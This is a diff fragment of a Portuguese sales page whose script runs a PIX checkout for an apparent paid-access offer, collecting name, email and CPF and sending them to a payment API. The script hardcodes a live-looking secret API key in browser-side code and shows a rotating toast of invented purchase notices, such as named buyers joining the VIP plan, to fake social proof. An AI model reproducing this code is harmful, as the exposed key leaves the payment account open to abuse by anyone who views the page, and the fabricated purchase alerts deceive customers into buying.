+    <div class="pix-box" id="pixStep">
+      <div class="modal-title">Pague via PIX 🔥</div>
+      <div style="font-size:13px;color:#888;margin-bottom:4px;">Escaneie o QR Code ou copie o código</div>
+      <div class="qr-wrap"><img id="qrCodeImg" src="" alt="QR Code PIX"></div>
+      <div class="pix-label">Código copia e cola</div>
+      <div class="pix-code-box" id="pixCode"></div>
+      <button class="copy-btn" id="copyBtn">📋 COPIAR CÓDIGO PIX</button>
+      <div class="await-text">Aguardando confirmação do pagamento…</div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── CONFIG EXATA DO api_integration.js ──
+const BLACKCAT_CONFIG = {
+    API_KEY: 'sk_live_d34cb247f44c5759743402f875b0998dcd6004d51470a8cc8e73f54e2ecfd71a',
+    BASE_URL: 'https://api.blackcatpagamentos.online/api',
+    ENDPOINTS: { CREATE_SALE: '/sales/create-sale' }
+};
+
+let currentOrder = { amount: 0, title: "" };
+
+function switchTab(el) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+}
+function toggleFaq(btn) { btn.parentElement.classList.toggle('open'); }
+
+function toggleLike(btn) {
+    const liked = btn.classList.toggle('liked');
+    const span = btn.querySelector('span');
+    const num = parseInt(span.textContent);
+    span.textContent = liked ? num + 1 : num - 1;
+}
+
+// Email autocomplete Gmail
+document.getElementById('custEmail').addEventListener('input', function() {
+    const val = this.value;
+    const dl = document.getElementById('emailSuggestions');
+    dl.innerHTML = '';
+    if (val && !val.includes('@')) {
+        const opt = document.createElement('option');
+        opt.value = val + '@gmail.com';
+        dl.appendChild(opt);
+    }
+});
+
+// CPF mask
+function formatCPF(value) {
+    value = value.replace(/\D/g, '');
+    if (value.length > 11) value = value.slice(0, 11);
+    if (value.length <= 3) return value;
+    if (value.length <= 6) return value.slice(0,3) + '.' + value.slice(3);
+    if (value.length <= 9) return value.slice(0,3) + '.' + value.slice(3,6) + '.' + value.slice(6);
+    return value.slice(0,3) + '.' + value.slice(3,6) + '.' + value.slice(6,9) + '-' + value.slice(9,11);
+}
+document.getElementById('custDoc').addEventListener('input', (e) => {
+    e.target.value = formatCPF(e.target.value);
+});
+
+// Toast com mensagens variadas
+const toastMessages = [
+  "⚡ Alguém acabou de <strong>&nbsp;Assinar o Plano Mensal!</strong>",
+  "🔥 <strong>João H.</strong>&nbsp;acabou de assinar o plano VIP!",
+  "⚡ <strong>Carlos S.</strong>&nbsp;garantiu acesso vitalício agora!",
+  "🚀 Alguém acabou de <strong>&nbsp;Assinar Todos os Combos!</strong>",
+  "💥 <strong>Marcelo T.</strong>&nbsp;acaba de entrar no VIP!",
+];
+let toastIndex = 0;
+function showToast() {
+  const t = document.getElementById('toast');
+  t.innerHTML = toastMessages[toastIndex % toastMessages.length];
+  toastIndex++;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 3500);
+}
+setTimeout(() => { showToast(); setInterval(() => showToast(), 30000 + Math.random()*30000); }, 6000);
+
+// Modal open/close
+document.getElementById('modalClose').onclick = () => { document.getElementById('modalOverlay').classList.remove('active'); };
+document.getElementById('modalOverlay').addEventListener('click', e => {
+  if (e.target === document.getElementById('modalOverlay')) document.getElementById('modalOverlay').classList.remove('active');
+});
+
+function openCheckout(amount, title) {
+    currentOrder = { amount, title };
+    document.getElementById('modalTitle').innerText = title;
+    document.getElementById('modalPrice').innerText = 'R$ ' + (amount / 100).toFixed(2).replace('.', ',');
+    document.getElementById('errorBox').style.display = 'none';
+    document.getElementById('formStep').style.display = 'block';
+    document.getElementById('loadingStep').style.display = 'none';
+    document.getElementById('pixStep').style.display = 'none';
+    document.getElementById('modalOverlay').classList.add('active');
+}
+
+async function processOrder() {
+    const name  = document.getElementById('custName').value.trim();
+    const email = document.getElementById('custEmail').value.trim();
+    const doc   = document.getElementById('custDoc').value.replace(/\D/g, '');
+
+    if (!name || !email || doc.length !== 11) {
+        document.getElementById('errorBox').innerText = "Preencha todos os campos corretamente (CPF com 11 dígitos).";
+        document.getElementById('errorBox').style.display = 'block';
+        return;
+    }
+
+    document.getElementById('errorBox').style.display = 'none';
+    document.getElementById('formStep').style.display = 'none';
+    document.getElementById('loadingStep').style.display = 'block';
+
+    const payload = {
+        amount: currentOrder.amount,
+        currency: "BRL",
+        paymentMethod: "pix",
+        items: [{ title: currentOrder.title, unitPrice: currentOrder.amount, quantity: 1, tangible: false }],
+        customer: { name, email, phone: "", document: { number: doc, type: "cpf" } },
+        pix: { expiresInDays: 1 }
+    };
+
+    try {
+        const response = await fetch(`${BLACKCAT_CONFIG.BASE_URL}${BLACKCAT_CONFIG.ENDPOINTS.CREATE_SALE}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'X-API-Key': BLACKCAT_CONFIG.API_KEY },
+            body: JSON.stringify(payload)
+        });
+
+        const result = await response.json();
+
+        if (result.success && result.data && result.data.paymentData) {
+            const pixData = result.data.paymentData;
+            let qrCode = pixData.qrCodeBase64 || "";
+            if (qrCode && !qrCode.startsWith('data:image')) {
+                qrCode = 'data:image/png;base64,' + qrCode;
+            }
+            document.getElementById('qrCodeImg').src = qrCode;
+            document.getElementById('pixCode').innerText = pixData.copyPaste || "";
+            document.getElementById('loadingStep').style.display = 'none';
+            document.getElementById('pixStep').style.display = 'block';
+            document.getElementById('copyBtn').onclick = () => {
+                navigator.clipboard.writeText(pixData.copyPaste).then(() => {
+                    const btn = document.getElementById('copyBtn');
+                    btn.textContent = '✅ CÓDIGO COPIADO!';
+                    setTimeout(() => btn.textContent = '📋 COPIAR CÓDIGO PIX', 2500);
+                });
+            };
+        } else {
+            throw new Error(result.message || "Erro na API");
+        }
+    } catch (error) {
+        console.error(error);
+        document.getElementById('loadingStep').style.display = 'none';
+        document.getElementById('formStep').style.display = 'block';
+        document.getElementById('errorBox').innerText = "Erro ao gerar PIX: " + error.message;
+        document.getElementById('errorBox').style.display = 'block';
+    }
+}
+
+document.getElementById('generateBtn').onclick = processOrder;
+
+window.GoToBackCheckout = function() { openCheckout(790, "Oferta Especial - Acesso Privacy"); };
+</script>
+</body>
+</html>
